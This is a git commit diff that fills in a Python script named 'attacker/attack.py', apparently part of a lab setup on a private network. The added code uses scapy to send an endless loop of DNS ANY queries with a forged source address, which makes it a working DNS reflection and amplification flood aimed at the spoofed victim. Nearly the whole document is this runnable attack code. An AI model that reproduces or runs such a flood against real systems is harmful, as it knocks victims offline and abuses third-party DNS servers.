c3c90d1809c9af696021c8cc13cb2df1b64bbb0d
Dan Ristea <dan.ristea@zerodeposit.com>
2020-02-08 22:43:19 +0000

    Flesh out attacker script

--- attacker/attack.py
+++ attacker/attack.py
@@ -1,1 +1,12 @@
-from scapy.all import *
+from scapy.layers.dns import DNS, DNSQR, dnsqtypes
+from scapy.layers.inet import IP, UDP
+from scapy.sendrecv import send
+
+while 1:
+    request = (
+        IP(src="172.16.238.10", dst="172.16.238.8") /
+        UDP(dport=53) /
+        DNS(rd=1, qdcount=1, qd=DNSQR(qname="reddit.com", qtype=255))
+    )
+    print(len(request))
+    send(request)
